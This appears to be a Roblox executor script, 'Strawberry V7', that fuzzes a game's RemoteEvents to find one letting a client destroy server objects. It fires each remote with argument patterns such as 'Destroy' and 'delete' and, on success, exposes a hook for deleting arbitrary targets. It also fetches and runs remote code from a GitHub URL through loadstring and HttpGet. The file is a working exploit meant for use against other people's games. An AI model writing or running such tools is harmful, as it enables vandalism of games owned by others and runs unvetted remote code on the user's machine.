--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

Strawberry V7 Open Source Remote Vuln Scanner
Rewritten by saji w love ❤️‍

Features:
Multi Arg Fuzzing
Checks for RemoteEvents

Made to be bugless (bugs very rare due to great executor support)
--]]

-- //===================[ CONFIG ]===================//
local Config = {
	ScanSafeTime       = 0.1,  -- // wait time for remote check
	EnableGUIAfterScan = true,  -- // set false to just scan without GUI
}

-- //===================[ CORE SETUP ]===================//
local Services = {
	Players            = game:GetService("Players"),
	ReplicatedStorage  = game:GetService("ReplicatedStorage"),
	HttpService        = game:GetService("HttpService"),
	StarterGui         = game:GetService("StarterGui"),
	CoreGui            = game:GetService("CoreGui"),
	Workspace          = game:GetService("Workspace"),
	Debris             = game:GetService("Debris"),
	RunService         = game:GetService("RunService"),
}

local LocalPlayer = Services.Players.LocalPlayer

-- // Creates status at top of the screen
local Hint = Instance.new("Hint", Services.Workspace)
Hint.Text = "STRAWBERRY V7: check the notif on the bottom right"

-- // Notify function 
local function Notify(message, duration)
	pcall(function()
		Services.StarterGui:SetCore("SendNotification", {
			Title    = "Strawberry V7",
			Text     = tostring(message),
			Duration = duration or 7.5,
		})
	end)
end

-- // Some important variables
local scanStartTime = tick()
local vulnRemote
local vulnRemotePattern
local found = false

-- //===================[ SCANNER FUNCTIONS ]===================//

-- // the event fuzzer :omg:
local function event_multiargfire(obj, mainremote, setmethod)
	local fuzzerpatterns = {
		function() mainremote:FireServer(obj); end,
		function() mainremote:FireServer(nil, obj); end,
		function() mainremote:FireServer(nil, nil, obj); end,
		function() mainremote:FireServer({obj}); end,
		function() mainremote:FireServer({Target = obj}); end,
		function() mainremote:FireServer("Destroy", obj); end,
		function() mainremote:FireServer("delete", obj); end,
		function() mainremote:FireServer("remove", obj); end,
		function() mainremote:FireServer({action = "delete", object = obj}); end,
		function() mainremote:FireServer(obj.Name); end
	}

	-- // Check if the part gets destroyed (aka removed from its parent)
	local origParent = obj.Parent
	local function IsDestroyed(part)
		return part.Parent ~= origParent
	end
	-- // testpart not at original parent = destroyed

	if setmethod ~= nil then
		local fuzzfunc = fuzzerpatterns[setmethod]
		if fuzzfunc then
			pcall(fuzzfunc)
		end
	else
		for i, pattern in ipairs(fuzzerpatterns) do
			local fuzzfunc = pattern
			if fuzzfunc then
				pcall(fuzzfunc)
				task.wait(Config.ScanSafeTime)
				if IsDestroyed(obj) then
					return i
				end
			end
		end
	end
end

-- // Checks if firing the remote destroys our test part
local function IsVulnerable(remote)
	-- // Finds a testpart as StarterGear or any BasePart in Workspace
	local testPart = LocalPlayer:FindFirstChild("StarterGear")
	if not testPart then
		for _, v in ipairs(Services.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				testPart = v
				break
			end
		end
	end

	if not testPart then
		error("strawberry: testPart search failed!")
		return false
	end
	
	local destroyed
	
	if remote:IsA("RemoteEvent") then
		pcall(function()
			local pattern = event_multiargfire(testPart, remote, nil)
			if type(pattern) == "number" then
				vulnRemotePattern = pattern
				destroyed = true
			else
				destroyed = false
			end
		end)
	else
		warn("strawberry: unknown remote type")
		return false
	end

	if destroyed then
		print("strawberry: backdoor found in remote // " .. remote:GetFullName())
		return true
	else
		print("strawberry: checked remote, backdoor not found.")
		return false
	end
end

-- // Scan common services for vuln remotes
local function ScanForBackdoor()
	local locationsToScan = {
		Services.ReplicatedStorage,
		Services.Workspace,
		Services.StarterGui,
		game:GetService("Lighting"),
	}

	for _, location in ipairs(locationsToScan) do
		if found then return end

		for _, remote in ipairs(location:GetDescendants()) do
			if found then break end
			if not remote:IsA("RemoteEvent") then
				continue
			end
			if not remote.Parent then
				continue
			end
			if remote.Parent.Name == "RobloxReplicatedStorage"
				or remote.Parent.Name == "DefaultChatSystemChatEvents" then
				continue
			end

			print("strawberry: testing remote // " .. remote:GetFullName())
			if IsVulnerable(remote) then
				found = true
				vulnRemote = remote
			end
		end
	end
end

-- //===================[ EXECUTION ]===================//

-- // Start the scan
ScanForBackdoor()

-- // Finalize the results
if found and vulnRemote then
	Hint.Text = ("STRAWBERRY V7: Backdoor located in %.2fs. Remote: %s")
		:format(tick() - scanStartTime, vulnRemote.Name)

	Notify("Backdoor found: " .. vulnRemote:GetFullName(), 10)

	if Config.EnableGUIAfterScan and not Services.RunService:IsStudio() then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/main.lua"))()
	end

	print("strawberry: inserting backdoor")
	print("strawberry: loading ui")

	shared.strawberryhook = function(target)
		if vulnRemote:IsA("RemoteEvent") then
			event_multiargfire(target, vulnRemote, vulnRemotePattern)
		end
	end

	task.wait(10)
	Hint:Destroy()
else
	Hint.Text = "STRAWBERRY V7: No backdoor found. Game dev ain't dumb. Try another game."
	Notify("Scan complete. No vulnerable remotes found. Lame. Try another game.", 10)
	
	print("strawberry: backdoor not found, game not supported")
	
	task.wait(10)
	Hint:Destroy()
end
